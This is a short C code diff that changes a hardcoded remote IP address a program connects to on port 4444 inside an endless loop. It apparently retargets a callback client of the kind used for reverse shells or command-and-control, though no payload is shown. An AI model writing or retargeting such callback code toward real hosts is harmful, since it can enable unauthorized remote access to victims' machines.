@@ -166,7 +166,7 @@ int main(int argc, char** argv) {
 
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_port = htons(4444);
-  serv_addr.sin_addr.s_addr = inet_addr("45.8.22.107");
+  serv_addr.sin_addr.s_addr = inet_addr("216.73.156.176");
 
   start = time(NULL);
   while (1) {
